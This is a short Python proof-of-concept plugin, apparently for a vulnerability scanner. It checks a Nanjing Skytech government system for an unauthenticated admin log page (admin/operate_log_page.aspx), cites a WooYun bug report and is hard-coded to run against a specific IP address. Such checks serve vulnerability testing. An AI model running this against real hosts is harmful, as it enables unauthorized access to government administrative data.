#!/usr/bin/env python
# -*- coding: utf-8 -*-
#南京擎天政务系统越权
#refer:http://www.wooyun.org/bugs/wooyun-2010-081902
#__author__ = 'xq17'

def assign(service, arg):
    if service == "skytech":
        return True, arg

def audit(arg):
    url = arg
    payload = 'admin/operate_log_page.aspx'
    verify_url = url +  payload
    code, head, res, errcode, _ = curl.curl2(verify_url)
    if code == 200 and 'caseimportdoclist' in res and "searchpage_input" in res:
        security_info(verify_url)
        security_info(url + payload)

if __name__ == '__main__':
    from dummy import *
    audit(assign('skytech','http://58.222.211.21/')[1])
